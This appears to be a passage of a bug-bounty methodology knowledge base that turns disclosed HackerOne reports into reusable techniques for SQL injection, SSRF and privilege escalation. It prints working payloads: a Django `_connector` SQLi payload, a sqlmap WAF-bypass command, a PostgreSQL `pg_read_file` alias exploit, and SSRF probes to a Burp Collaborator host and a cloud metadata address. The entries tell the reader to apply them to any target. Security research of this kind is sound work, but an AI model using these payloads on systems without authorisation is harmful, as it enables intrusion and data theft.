# sqli-nosqli — part 2/2 (23 segment(s))
# content-aware dedupe applied; every unique entry preserved.

### [Bugbountyskills.md] 17.316 THE ORM PARAMETERIZES VALUES, NOT QUERY STRUCTURE — Django's `WhereNode.as_sql` interpolates the Q-object CONNECTOR into the WHERE clause with `%s`, so `Q(**user_input)` lets an attacker set `_connector` to arbitrary SQL (Django, HackerOne #3335709, critical, CVE-2025-64459; body read IN FULL this pass on the `.json` route, 8,120-char body; VERIFIED — reproduced locally on Django 5.2.7, patched 5.2.8 rejects)

SOURCE: https://hackerone.com/reports/3335709 — Django, "SQL Injection in Django ORM via Unvalidated `_connector` in Q Objects" (weakness `SQL Injection`; critical; reporter `cyberstan`; submitted 2025-09-12, disclosed 2025-11-06, resolved; CVE-2025-64459, CVSS 9.1; fixed in Django 5.2.8 / 5.1.14 / 4.2.26)  read 2026-11-09.
CLASS: SQL injection — the ORM's query STRUCTURE (the AND/OR connector) is built by raw `%s` interpolation, so a user-controlled key reaches the WHERE clause (CWE-89).
CORE METHOD: (1) THE SINK — verbatim: `django/db/models/sql/where.py`, `WhereNode.as_sql` does `conn = ' %s ' % self.connector` with no validation; (2) THE ENTRY POINT — verbatim: `Q.__init__` accepts `_connector` as an ordinary keyword and the common app pattern is `filter_dictionary = request.json.get('filters', {})` / `query = Q(**filter_dictionary)` / `results = User.objects.filter(query)`; (3) THE PAYLOAD — verbatim: `{"is_admin": false, "username": "nonexistent_user", "_connector": ") OR 1=1 OR ("}`; (4) THE GENERATED SQL — verbatim and REPRODUCED byte-for-byte this pass on Django 5.2.7/sqlite: `SELECT "poc_user"."id", "poc_user"."username", "poc_user"."is_admin" FROM "poc_user" WHERE (NOT "poc_user"."is_admin" ) OR 1=1 OR ( "poc_user"."username" = %s)` with params `('nonexistent_user',)` -> the filter is bypassed and the admin row `root` is returned; (5) THE FIX — Django 5.2.8 validates `self.connector` against `AND`/`OR`/`XOR` in `WhereNode.as_sql` and rejects `_connector` as a lookup key in `QuerySet.filter()/exclude()/get()`; REPRODUCED this pass: the same PoC on 5.2.8 raises `ValueError: _connector must be one of 'AND', 'OR', 'XOR', or None.`
DETECTION SIGNAL: a JSON/query filter API that unpacks a request dictionary into `Q(**filters)` or `filter(**filters)`; a Django app on a vulnerable version (< 4.2.26 / < 5.1.14 / < 5.2.8); an ORM-generated WHERE clause containing raw SQL from a request parameter; a filter endpoint whose result set changes when a structural keyword is added to the filter object.
CHAIN: any caller who can supply the KEYS of a filter dictionary (a JSON filter/search API) -> the dict is unpacked into `Q(**...)` -> `_connector` reaches `WhereNode.as_sql` and is interpolated into the WHERE clause -> arbitrary SQL in the WHERE clause -> filter bypass / full-table read / data exfiltration (the report's impact: "Bypass Access Controls … Retrieve any and all records from the queried table … Exfiltrate Sensitive Data … all users, including administrators"; the reporter also notes a DoS via a complex payload).
TRANSFERABLE TEST: on any Django app, find a filter/search endpoint that accepts a JSON object of filters (or query params) and passes them to `Q(**...)`/`filter(**...)`; send `{"<real_field>": <value>, "_connector": ") OR 1=1 OR ("}` and diff the result set against the unfiltered control — a bypassed filter (or a changed error/SQL behaviour) is the bug. First fingerprint the Django version; patched versions reject `_connector` outright. Rule: **the ORM's parameterization covers VALUES, not the query STRUCTURE — any user-controlled key that reaches `Q(**kwargs)`/`filter(**kwargs)` (especially `_connector`, `_negate`, or a lookup name) is a SQLi vector, and the test is to inject a STRUCTURAL keyword, not a quote.**
WHY IT IS A NEW GENERAL METHOD: 0 hits for `_connector`, `Q(**)`, `WhereNode`, `as_sql`, `cyberstan`, `3335709`, `CVE-2025-64459`; the ledger's §7.5 (Django ORM `FilteredRelation` alias injection -> RCE, CVE-2025-57833, H1 #3292573) is a DIFFERENT Django ORM SQLi — the alias name in `annotate(**{user_data: ...})` — not the Q-object `_connector`. Slot 17.316.

NOTE — §17 additions 2026-11-09 batch 99 (§17.316 appended from 6 sources read ONE BY ONE in the given order; 2 entries appended to the harvest ledger, 1 §17 slot). Sources: #3335709 (Django, full body via the `.json` route; VERIFIED locally), #2666323 (U.S. DoD, full body via the `.json` route — 302->200 client-side auth-gate bypass, ledger entry, no §17 slot). NOT APPENDED: #3079738 (Basecamp, `no-content`, 0 B — only the auto-summary naming a HEY Android deeplink -> bearer-token exfiltration; mobile deep-link class already recorded at §17.72), #3219944 (SingleStore, `no-content`, 0 B — `r.jina.ai` summary: `GetNotebookScheduledPaginatedJobs` IDOR by `projectID`; generic BOLA/IDOR already covered by V-01/V-05), #2632876 (HackerOne, body readable 5,214 B — `/:handle/hacker_demand` leaks a private program's policy page after revocation; the atom is already recorded from #386997, this is a DELTA — new endpoint + the never-a-member Report Participant actor; low, no chain). INVALID: #3091909 (WakaTime, body fully redacted — "credentials found on a Telegram bot"; no source, no technique, no request shape). Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-09.md`.

### [Bugbountyskills.md] 17.415 FIND THE INJECTION POINT BY BROWSING WITH A PROXY AND PICKING THE UNIQUE POST REQUEST OUT OF HTTP HISTORY; WHEN A FIREWALL BLOCKS SQLMAP'S `--current-db`, ADD `--tamper=between --no-cast` (Medium @jawadmahdi, "Blind Time Based SQLI and bypass technique", 2021-07-16; UNVERIFIED — not reproduced). THE RECON, verbatim: "I manually browsed all the URLS and they were getting collected in BURPSUITE HTTP HISTORY. I found a unique POST request which weren't normally available. So I suddenly remembered that sometimes manually browsing can get you unique URLS if you use a PROXY like Burpsuite, I read it in WEB APPLICATION HACKER HANDBOOK." THE PAYLOAD, verbatim: "I found many parameters in that POST request and I started checking those parameters with this payload `'XOR(if(now()=sysdate(),sleep(5\*1),0))OR'` — And to my surprise, It worked and slept for 5 seconds." THE BLOCK, verbatim: "I immediately copied the request and used SQLMAP on that. I used different SQLMAP command but a firewall was blocking me from fetching the current database." THE BYPASS, verbatim: `sqlmap.py -r request.txt -p "value" -v 3 — level=5 — risk=3 — time-sec=15 — tamper=between — current-db — no-cast` — "and guess what? I was able to retrieve the current database name." DETECTION SIGNAL: a POST request in the proxy history that is NOT linked from any page/button (a "unique" request only reachable by browsing a specific flow); a parameter that sleeps N seconds on a time-based payload; a sqlmap run that confirms the injection but FAILS to fetch the current database (a WAF/firewall blocking the extraction, not the injection). TRANSFERABLE TEST: on ANY target — browse the whole app through Burp/http history and list every POST request that has no visible link/button (a "unique" request); test each of its parameters with a quote-balanced time oracle (`'XOR(if(now()=sysdate(),sleep(5*1),0))OR'`, `'or(if(now()=sysdate(),sleep(5),0))or'`) and time the response; if sqlmap confirms the injection but `--current-db` is blocked, re-run with `--tamper=between --no-cast --current-db --level=5 --risk=3 --time-sec=15`; a returned database name = the WAF bypass worked. Rule: **when sqlmap is blocked by a firewall from fetching the current database, add `--tamper=between --no-cast` — and find the injection point by browsing with a proxy, because the vulnerable request is often a unique POST that no page links to.** (The XOR time-oracle payload itself is already recorded — innogames, URL-path injection — and is deliberately NOT re-recorded here; this slot is for the discovery heuristic and the tamper combo.)

NOTE — §17 additions 2026-11-10 batch 132 (§17.413–§17.415 appended from the 6 assigned sources read ONE BY ONE in the given order; 3 entries appended to the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file + 3 §17 slots). NEW: (1) boomneroli / n3r0li — a LOWER role (`Database Administrator`) can invoke an ADMIN-ONLY GraphQL mutation (invite user / edit permissions) because the role check trusts a STATIC, client-supplied role id harvested from a temp org -> vertical privesc to full admin -> §17.413. (2) coffeejunkie / caffeinevulns — a raw-XML FORM FIELD (`WebDocXML`) is a blind-XXE sink; confirm with an OOB callback, then point the entity at `http://localhost:<port>` and TIME the response (open <1000 ms, closed >2000 ms) for an internal port scan -> §17.414. (3) jawadmahdi — find the injection point by browsing with a proxy and picking the UNIQUE POST request out of Burp history, then defeat a firewall that blocks sqlmap's `--current-db` with `--tamper=between --no-cast` -> §17.415. VALID-BUT-DUPLICATE (read, nothing new, no entry): yasshk / "Blind SSRF in URL Validator" — the attacker-hosted redirector (ngrok + PHP `header("Location: http://127.0.0.1:<port>")`) that defeats the internal-address filter and the timing-based port scan on a URL-validator endpoint are BOTH already recorded (the redirect bypass "a `302 → internal` redirect served from your own host to defeat naive allowlists" and "sweep hosts/ports by timing", ledger ~line 3365; the validator/image-check carrier at ~line 10552). INVALID FOR TECHNIQUE (real and readable, but no concrete method / below the bar, no entry): philippeharewood / CrowdTangle Deletion Framework API — a root GraphQL query exposes internal CrowdTangle API calls (`CrowdTangleDeletionResult` with `id`/`parent_id`/`system`) to regular users, but the page gives no request shape, parameter or PoC, and Facebook's own wording is "this wasn't enough to pass the bar for a bounty" (rewarded only as a hardening opportunity); philippeharewood / Facebook gaming community invites — the page states only that `community_manager_invite_profiles` is disclosed, with no request shape or PoC, and the credited previous-work page (read via `web_extract`) is equally thin (a rejected invitee stays on the pending list; Facebook closed it as informative) — a P4/P5-class privacy primitive per doctrine §2(b)/§6. 6 sources read, 0 fabricated.

### [Bugbountyskills.md] 17.437 A SETUP/BOOTSTRAP ENDPOINT THAT AUTHENTICATES A LOW-PRIVILEGE CONSOLE ROLE BUT PERFORMS A CREDENTIAL-SETTING OPERATION IS A DIRECT PRIVILEGE-ESCALATION PATH TO SITE ADMINISTRATOR — ON GHES THE MANAGEMENT CONSOLE EDITOR CAN CALL `/setup/api/*` AND THEN RESET THE ROOT SITE ADMINISTRATOR PASSWORD (HackerOne #2197796, GitHub, "GHES Management console EoP (editor to site admin)", reporter `imrerad`, submitted 2023-10-08, resolved/disclosed 2024-01-08, High, CVE-2023-46647 / GHSA-9g9p-wc7c-q948, CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H = 8.0, CWE-269; `visibility: no-content`, technique read from the public advisory + the GHES 3.8/3.9/3.10 release notes + the public Management Console REST API docs; UNVERIFIED — not reproduced). THE ADVISORY, verbatim: "Improper privilege management in all versions of GitHub Enterprise Server allows users with authorized access to the management console with an editor role to escalate their privileges by making requests to the endpoint used for bootstrapping the instance." THE IMPACT, verbatim (GHES 3.8.12 release notes): "An attacker with access to a Management Console user account with the editor role could escalate privileges by making requests to the endpoint used for bootstrapping the instance, and then reset the root site administrator password." THE ENDPOINT FAMILY, verbatim (public docs): the Management Console API is `http(s)://HOSTNAME:8443/setup/api/...` — `GET /setup/api/configcheck`, `POST /setup/api/configure`, `GET|POST /setup/api/maintenance`, `GET|PUT /setup/api/settings`, `GET|POST|DELETE /setup/api/settings/authorized-keys`, `POST /setup/api/start`, `POST /setup/api/upgrade`; "You need to pass your root site administrator password as an authentication token to every endpoint in this category except Create a GitHub license" AND "Management Console user accounts can also authenticate to access this endpoint" (`curl -L -u "YOUR_USER_NAME:YOUR_PASSWORD" 'https://HOSTNAME:ADMIN-PORT/setup/api'`). THE FAMILY: the same editor role is the precondition for CVE-2024-1374 (nomad template injection in audit-log forwarding -> admin SSH), CVE-2024-1378 (SMTP), CVE-2024-1355 (actions-console service URL), CVE-2024-2443 / CVE-2024-3646 / CVE-2024-3684 / CVE-2024-0507 / CVE-2024-1372 (command injection in GeoJSON / Artifact & Logs / Migrations Storage / SAML); the editor role was later deprecated. DETECTION SIGNAL: an appliance/on-prem MANAGEMENT CONSOLE exposing a SETUP/BOOTSTRAP/INITIALIZATION endpoint family (`/setup/*`, `/bootstrap/*`, `/install/*`, `/configure/*`, `/init/*`) on a separate admin port; a low-privilege console role (editor/operator/read-write) that can authenticate to it; a password-reset / credential-set / user-create / license-start operation reachable from the bootstrap flow; a role model where the console user is NOT the root/site administrator. TELL: the docs name the bootstrap endpoint as the ONE endpoint that does NOT require the root site administrator password, and the console-user auth path is documented as sufficient for the whole `/setup/api` category. CHAIN: Management Console EDITOR -> authenticates to `/setup/api` with console-user credentials -> drives the bootstrap/configuration and resets the root site administrator password -> root site administrator (full control of every repository, user and secret; CVSS 8.0 C:H/I:H/A:H). A P4-looking "an editor can call a setup endpoint" raised to site admin. TRANSFERABLE TEST: on ANY appliance/on-prem management console — (1) enumerate the setup/bootstrap/initialization endpoint family on the admin port (`/setup/*`, `/bootstrap/*`, `/install/*`, `/configure/*`, `/init/*`, `/api/setup*`); (2) authenticate with the LOWEST-privilege console role (editor/operator/read-write), not the root/site admin; (3) call every bootstrap endpoint and look for a password-reset / credential-set / user-create / license-start operation; (4) if any succeeds, use it to set the root/site-administrator credential and log in as site admin. Rule: **a setup/bootstrap endpoint that authenticates a low-privilege console role but performs a credential-setting operation is a direct privilege-escalation path to site administrator — the bootstrap flow is the one place where the role check is often missing.**

NOTE — §17 additions 2026-11-11 batch 143 (§17.436–§17.437 appended from the 6 assigned sources read ONE BY ONE in the given order; 3 entries appended to the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file `/root/hackbot-architecture/knowledge/methodologies-2026-11-11.md` + 2 §17 slots). NEW: (1) HackerOne #2410111 (hyperledger, "Docker Secret Disclosure via GitHub Actions Cache Poisoning", reporter adnanthekhan, submitted 2024-03-09, resolved/disclosed 2024-04-20, High 8.9, Information Disclosure; `visibility: no-content`, technique read in full from the reporter's credited writeup) -> §17.436 — GitHub Actions "cache blasting": steal `ACTIONS_RUNTIME_TOKEN` + `CacheServerUrl` from the runner memory, fill the repository cache past 10 GB to force eviction, re-upload a poisoned tar under the target key+version, and the privileged workflow's blind `extractTar` overwrites arbitrary files -> code execution in the privileged workflow -> Docker Hub push credential -> poisoned Besu images. (2) HackerOne #2197796 (GitHub, "GHES Management console EoP (editor to site admin)", reporter imrerad, submitted 2023-10-08, resolved/disclosed 2024-01-08, High, CVE-2023-46647 / GHSA-9g9p-wc7c-q948; `visibility: no-content`, technique read from the public advisory + GHES release notes + Management Console API docs) -> §17.437 — a Management Console EDITOR can call the `/setup/api/*` bootstrap endpoint family (documented as reachable by a console user, not just the root site admin) and then reset the root site administrator password -> site admin. DELTA, no §17 slot: HackerOne #2082680 (HackerOne, "Register & create a ticket as somebody else on HackerOne Support", reporter slothzap, submitted 2023-07-24, disclosed 2023-07-31, severity None, Misconfiguration; `visibility: no-content`, method read from the team summary + the public body of the sibling #2068830) — an unauthenticated Freshdesk support-portal ticket form binds the ticket to a visitor-supplied requester identity, so anyone can file a ticket as another user and the support desk performs account actions on it; a carrier DELTA of §17.111 (the inbound-email identity-spoofing class) with a NEW ENTRY POINT (the web portal form). VALID BUT NOT APPENDED (nothing new, nothing invented): HackerOne #2383486 (Mozilla, "Insecure S3 Bucket Exposing Git Directory in Mozilla Foundation Infographics Project", reporter psycho_012, submitted 2024-02-21, resolved/disclosed 2024-03-13, Low, Improper Access Control - Generic; full body read via the local disclosed-reports mirror) — a static-hosting S3 bucket serves `/.git/` and GitDump pulls it, but the exposed-`.git` -> `git-dumper` method is already recorded (§9.1 / §5 V-01) and the report documents no chain beyond "source code, configuration files, and potentially secrets" (the team said the leaked token "was no longer valid"). HackerOne #1717210 (Semrush, "Exposure of service tokens to webpack bundle", reporter a_d_a_d_m, submitted 2022-09-29, resolved/disclosed 2024-03-08, High, Information Disclosure; `visibility: no-content`, 0 B body, team summary only) — secrets bundled into client-side JS is already recorded (V-06 secret-pattern grep), and the summary carries no bundle URL, variable name or request shape. HackerOne #1265390 (Glassdoor, "Reflected XSS on https://www.glassdoor.com/job-listing/spotlight", reporter vestige23, submitted 2020, disclosed 2021-08-19, Medium, XSS - Reflected; full body read via the local disclosed-reports mirror after the live page 403'd, the browser tool hit Cloudflare, `r.jina.ai` hit the Cloudflare wall, the Wayback captures were the JS-disabled SPA shell, and the ajaysenr mirror 404'd) — the `callback` query parameter is reflected as raw HTML (`<!DOCTYPE html><html><svg/onload=...>`), a generic reflected XSS with no bypass or escalation beyond the standard payload. 6 sources read, 0 fabricated.

### [Bugbountyskills.md] 17.451 A FREE-TEXT BUSINESS FIELD IN AN UNAUTHENTICATED CHECKOUT/PAYMENT ACTION IS A SERVER-SIDE FETCH SINK: THE PAYMENT-GATEWAY INTEGRATION ISSUES THE HTTP REQUEST, SO THE SSRF IS BLIND AND THE SUCCESS RESPONSE LOOKS NORMAL (Acronis / cz.acronis.com, HackerOne #1086206, "Blind SSRF vulnerability on cz.acronis.com", reporter `cabelo`, submitted 2021-01-24, disclosed 2024-08-27, Medium — weakness Server-Side Request Forgery (SSRF); `visibility: full`, body read in full this pass via the live `.json` route, 2,696 B; UNVERIFIED — not reproduced). THE ENTRY POINT: `POST https://cz.acronis.com/wp-admin/admin-ajax.php` with `action=createPayment` (the WooCommerce cart checkout, `Referer: https://cz.acronis.com/kosik/?item=7200`). THE CARRIER, verbatim from the report: "Parameter vulnerable: address and company" — the payload was `address=http%3a%2f%2fjczo3ewu8jpfgyiajmkacspsnjtbh0.burpcollaborator.net/ssrf`, i.e. an ABSOLUTE URL in a free-text delivery-address field, not in a parameter that looks like a URL. THE REQUEST IS OTHERWISE AN ORDINARY GUEST CHECKOUT (`items[0][name]`, `items[0][price]`, `name`, `email`, `phone`, `zip`, `city`, `isCompany=YES`), and the reporter's own claim is unauthenticated: "this vulnerability allows any unauthenticated user/client to make Wordpress send HTTP requests to any URL/address (internal or external)". THE ORACLE: the app still answers `HTTP/1.1 200 OK` with `{"status":"ok","gw_url":"https:\/\/gate.gopay.cz\/gw\/v3\/eec2d2792d0935ea959b71b0762a4559"}` — the SSRF is BLIND and indistinguishable from a successful checkout — while the proof is out-of-band: "Callback HTTP connection from Acronis server 109.123.216.85 (SSRF vulnerability)". DETECTION SIGNAL: any unauthenticated `admin-ajax.php` / guest-checkout / payment action (`action=createPayment`, a `wp_ajax_nopriv_*` handler) whose form has FREE-TEXT fields forwarded to a downstream integration (payment gateway, CRM, shipping/geocoding, invoicing); a 200 that still carries the normal gateway/redirect value (`gw_url`, `redirect_url`, `payment_url`) while an OOB callback arrives from the target's own address; MORE THAN ONE field working (`address` AND `company`) — the tell that the sink is "any field the integration passes on", not one named URL parameter. CHAIN: an anonymous visitor (primitive: the checkout AJAX action is unauthenticated) -> a free-text business field (`address`/`company`) is handed to the payment integration, which issues an HTTP request to it (primitive: a free-text field is a server-side fetch sink) -> the target's server makes an outbound request to any internal or external address (escalation: blind SSRF with internal reach) -> internal host/port probing and, where the integration can reach cloud metadata or an internal service, credential/service access (impact: internal reach; HackerOne rated this instance Medium as a blind SSRF, doctrine §6 rates SSRF with internal reach P2). TRANSFERABLE TEST: on ANY checkout / payment / shipping / invoice form — (1) capture the payment request and enumerate EVERY free-text body field (address lines, company, customer note, `url`/`callback`/`return_url`, tax/VAT fields); (2) set each field, one at a time, to `http://<your-collaborator>/ssrf` and submit; (3) watch the collaborator for a callback whose source address belongs to the target; (4) the CONTROL is the same checkout with a benign value — benign = no callback, URL-value = callback, and the response is a normal 200 both times; (5) replay the winning field with `http://127.0.0.1:<port>/` and `http://169.254.169.254/latest/meta-data/` and sweep ports by timing. Rule: **in a payment flow the SSRF carrier is usually a free-text field the gateway integration forwards, not a parameter that looks like a URL — test address/company/note fields, and use the normal 200-with-gateway-URL response as the "nothing is wrong" control.** WHY IT IS A NEW GENERAL METHOD: 0 hits across all three write targets for `1086206`, `createPayment`, `gw_url`, `gate.gopay.cz`, `cz.acronis.com`, or a free-text checkout field (`address`/`company`) used as a server-side fetch sink; the recorded SSRF material targets URL-TYPED parameters (`url=`, `file_reference=`, `filename=`, a webhook "test request", `/_next/image?url=`, SVG `fill="url(…)"`) or OAuth `Host`-header construction, and the recorded `admin-ajax.php` material (~ledger 4199-4209, §17.117) is the Formidable shortcode -> ORDER BY SQLi path, not an SSRF carrier; the standing "enumerate every `admin-ajax.php` action" advice is generic and does not name business fields as fetch sinks. Slot 17.451. UNVERIFIED (not reproduced) — no Acronis property was touched this pass.

NOTE — §17 additions 2026-11-11 batch 150 (§17.451 appended from the 6 assigned sources read ONE BY ONE in the given order; 2 entries appended to the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file `/root/hackbot-architecture/knowledge/methodologies-2026-11-11.md` + 1 §17 slot). NEW: #1086206 (Acronis/cz.acronis.com — the unauthenticated WooCommerce checkout action `action=createPayment` on `/wp-admin/admin-ajax.php` takes the FREE-TEXT `address`/`company` field and the payment integration issues an HTTP request to it -> blind SSRF with an OOB callback from the Acronis server while the app still returns the normal `gw_url` -> §17.451). DELTA (no §17 slot): #840243 (Valve/partner.steamgames.com — `visibility: no-content`, body withheld; the title + program summary ("Shell injection was achieved on a publishing gateway through metacharacter injection in an item-upload path") name the FILE EXTENSION of the `item_image_small`/`item_image_large` upload fields as the carrier -> shell on the publishing gateway, Critical; a delta on the recorded filename-reaches-a-shell family, not reproducible from public material). NOT APPENDED (duplicate): #2759243 (U.S. Dept of Defense, time-based blind SQLi in the `sortBy` ORDER BY parameter of `/app/SearchDocs.aspx` — the already-recorded ORDER BY / `sort`-parameter time-based blind class, §7.8 + ~ledger 7923 + §17.117) and #2684274 (Mars, Swagger-UI `configUrl` reflected XSS — the same mechanism already recorded with a full ATO chain at ~ledger 2988). INVALID: #2828693 (Mars, `visibility: no-content`, 0 B body; the Mars summary gives no endpoint, no request shape and no parameter, and the technique is the already-recorded BAC/IDOR class §3 — its sibling #2828641 was judged the same way in batch 146). VALID-BUT-NOT-APPENDED: #1315907 (U.S. Dept of Defense, "Open Akamai ARL XSS", Medium, full 711 B body — a reflected-XSS primitive with no chain beyond "The attacker can execute JS code"; the Akamai ARL URL shape `/7/0/<ttl>/<serial>/<origin-host>/<path>` is logged as a LEAD only, since nothing beyond the reflected XSS is documented). 0 fabricated. Knowledge intake only — no target was touched; the only network traffic was `web_extract`/`curl` against `hackerone.com` (live `.json` for all six ids), the Wayback availability + page endpoints, `r.jina.ai` (401), the browser tool on the three `no-content` pages, the ajaysenr mirror, two web searches, and reads of the local disclosed-reports parquet mirrors `/tmp/h1_{train,val,test}.parquet`.

### [Bugbountyskills.md] 17.456 A CHARACTER DENYLIST THAT BLOCKS QUOTES IS NOT A SANITISER ON POSTGRESQL — `$tag$…$tag$` DOLLAR-QUOTING IS A QUOTE-FREE STRING LITERAL, SO A "SANITISED" IDENTIFIER/ALIAS FIELD IS STILL INJECTABLE (Django `FilteredRelation`, HackerOne #3417967, "Potential SQL Injection when annotating FilteredRelation on PostgreSQL", weakness SQL Injection, severity high 8.1 `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`, reporter `stackered`, submitted 2025-11-09, disclosed 2025-12-02, resolved, CVE-2025-57833 + CVE-2025-59681; full body read IN FULL this pass on the live `.json` route; UNVERIFIED — not reproduced). THE SINK: the SAME `FilteredRelation` alias as §7.5 — a user-controlled alias passed as `annotate(**{user_data: FilteredRelation("editor")})` and re-referenced by `.select_related(user_data)`, interpolated into the SELECT column list and the `JOIN ... ON (...)` clause and REFLECTED MULTIPLE TIMES in the generated query. THE INCOMPLETE FIX: CVE-2025-57833 / CVE-2025-59681 added a `FORBIDDEN_ALIAS_PATTERN` regex (`django/db/models/sql/query.py:60`) that rejects the QUOTE characters — and does NOT reject `$`. THE BYPASS: on PostgreSQL `$` is the DOLLAR-QUOTING delimiter, so `$$something$$` / `$tag$something$tag$` is a raw string literal needing NO quote characters at all. THE POC ALIAS, verbatim: `$a$,$b$,$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1` — the `$a$…$a$`, `$b$…$b$`, `$c$…$c$` pairs close over the injected text so the rest of the ORM-generated query parses as raw strings and `pg_read_file($$/etc/passwd$$)` runs inside a subselect; the reporter's output shows `/etc/passwd` returned as the `title` column from a local PostgreSQL container. THE FIX per the reporter: add `$` to `FORBIDDEN_ALIAS_PATTERN`. DETECTION SIGNAL: an ORM/query-builder alias, annotation, `with`/`join` name, `order by` label or column-alias field validated by a REGEX/character DENYLIST rather than an allowlist of identifier characters, and reflected more than once into the generated SQL; backend is PostgreSQL. TRANSFERABLE TEST: on ANY PostgreSQL-backed app where a user-controlled string reaches SQL through an identifier/alias/column-list position and is "sanitised" by a character filter — (1) enumerate which characters the filter rejects: submit `'`, `"`, backtick, backslash, `;`, `--`, `$$`, `$tag$` one at a time and compare responses/errors; (2) if `$` is accepted, inject the PoC alias above (or the minimal `$$`) and watch for a SQL error or a returned row; (3) escalate with `pg_read_file`, `pg_ls_dir`, `COPY ... TO PROGRAM`, `lo_import`; (4) confirm the filter is character-based by finding the regex/validator in the source (grep `FORBIDDEN_ALIAS_PATTERN`, `alias`, `re.match`). Rule: **a character denylist that blocks quotes is not a sanitiser on PostgreSQL — `$tag$…$tag$` dollar-quoting is a quote-free string literal, so test every "sanitised" identifier field with `$` and `$$…$$` before concluding it is safe.** WHY IT IS A NEW GENERAL METHOD: 0 hits across all three write targets for `3417967`, `CVE-2025-59681`, `FORBIDDEN_ALIAS_PATTERN`, `dollar`, `$$something$$`. §7.5 (H1 #3292573, the SAME sink) records the alias-injection primitive and its `"`-delimiter breakout and its transferable test assumes the quote delimiter is reachable — #3417967 is the INCOMPLETE-FIX bypass of that same sink, where the delimiter becomes dollar-quoting. The playbook cheat-sheet's `quoteless on PG` material (`chr(97)||chr(98)`, `decode('61','hex')`) is a DIFFERENT mechanism (function-call string construction, not a literal delimiter). Slot 17.456. UNVERIFIED (not reproduced).

### [Bugbountyskills.md] 17.460 AN OPEN `/wp-json` ROUTE INDEX IS A MAP OF UNDOCUMENTED PLUGIN ENDPOINTS — PAIR THE ROUTE THAT DISCLOSES AN IDENTIFIER WITH THE SIBLING ROUTE THAT CONFIRMS IT, AND A ONE-OFF LEAK BECOMES A VALIDATED ACCOUNT LIST (Automattic / WordPress VIP, HackerOne #540301, "Wordpress VIP leaks email of the test a/c", weakness Information Disclosure, severity medium 5.3 AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N, reporter `cryptordx`, submitted 2019-04-16 / disclosed 2019-05-28, asset learn.fb.com, resolved, bounty yes; `visibility: full`, body read in full this pass via the live `.json` route; UNVERIFIED — not reproduced). THE DISCLOSURE, verbatim: "i was testing learn.fb.com and i came to known that its wp-json is open and when i saw all the routes of the websites than i got to known that one end-point is leaking their internal email address the endpoint is as follow https://learn.fb.com/wp-json/th/v1/user_generation". THE ORACLE, verbatim: "when we pass a wrong email it shows null as output but if the email is valid then only empty field is shown" — the sibling route `https://learn.fb.com/wp-json/th/v1/user_generation/login/p={email_id}` answers NULL for a non-existent address and an empty-but-present object for a real one. THE CHAIN: the disclosed test-account address is not the end of it — it is the INPUT to the sibling endpoint, and the sibling endpoint's differential confirms arbitrary addresses are real. THE GENERALISATION: on WordPress, an open `/wp-json` index enumerates every custom plugin route, including undocumented ones; for each route look for (a) an unauthenticated route that returns PII, and (b) a sibling route that takes the same identifier as a parameter and answers differently for present vs absent values. DETECTION SIGNAL: `/wp-json/` 200 with a `routes` object listing custom namespaces (`/wp-json/<vendor>/v1/...`) beyond the standard `wp/v2`; route names implying generation/lookup/login/exists; a null-vs-empty differential on a `p=`/`email=`/`id=` parameter; a route absent from the plugin's public docs and linked from no page. TRANSFERABLE TEST: (1) `GET /wp-json/` and, if closed, `/wp-json/wp/v2/` and `/?rest_route=/`; dump the full `routes` object and list every custom namespace; (2) call each undocumented custom route unauthenticated with no params and with a benign probe, and read the response for PII (e-mails, usernames, ids, internal paths); (3) where a route returns an identifier, find a SIBLING route that accepts it as a parameter (`/login/p=`, `?email=`, `?id=`, `/exists/`) and send a KNOWN-GOOD and a KNOWN-BAD value — a null-vs-empty / error-vs-success differential is an existence oracle; (4) record the disclosure + the oracle as ONE chain. Rule: **an open `/wp-json` route index is a map of undocumented plugin endpoints — the reportable unit is not the leaked e-mail but the pair of routes (one that discloses an identifier, one that confirms it), because that pair converts a one-off leak into a valid account list.** WHY IT IS A NEW GENERAL METHOD: 0 hits for `540301`, `user_generation`, `th/v1`, `learn.fb.com`. Recorded WordPress REST material covers `/xmlrpc.php` enumeration, REST user enumeration (V-04), the batch route-dispatch desync -> unauthenticated SQLi (§17.4), a wrapper route with `permission_callback => '__return_true'` (§17.418) and an ACF reference-field read-permission bypass (§17.417) — NONE records a custom `user_generation`-style route that discloses an internal e-mail AND a sibling `login/p={email}` route that confirms existence by a null-vs-empty differential. Slot 17.460. UNVERIFIED (not reproduced).

NOTE — §17 additions 2026-11-11 batch 154 (§17.458–§17.460 appended from the 6 assigned sources read ONE BY ONE in the given order; 3 entries appended to the harvest ledger `/root/bugbountyhuntingskills.md` and the dated knowledge file `/root/hackbot-architecture/knowledge/methodologies-2026-11-11.md`). NEW: #1007988 (nested REST parent-path-segment IDOR -> cross-tenant comment write + thread read -> §17.458), #386292 (Slack Event Subscriptions URL field -> `[::]` loopback alias bypasses a string-based host filter -> full-read SSH/SMTP banner disclosure -> §17.459), #540301 (open `/wp-json` index -> custom route discloses internal e-mails + sibling `login/p={email}` null-vs-empty existence oracle -> §17.460). VALID-BUT-NOT-APPENDED: #756182 (Nord Security — public git repo + Cloudflare-origin IP disclosure; core-ineligible version/origin disclosure, no request shape/bypass/chain; recovered from the ajaysenr mirror because the live H1 page is 404/302 and Wayback is the JS shell), #374106 (Brave — missing `com.apple.quarantine` xattr on downloads -> GateKeeper bypass; Low, Java-pre-installed precondition, no RCE/data route -> lead), #629087 (Chainlink — `~all` vs `-all` SPF; doctrine §2(c) ineligible hardening, program rebutted severity, no forge demonstrated). 0 fabricated; no target touched. Full per-source route/honesty records are in the harvest ledger.

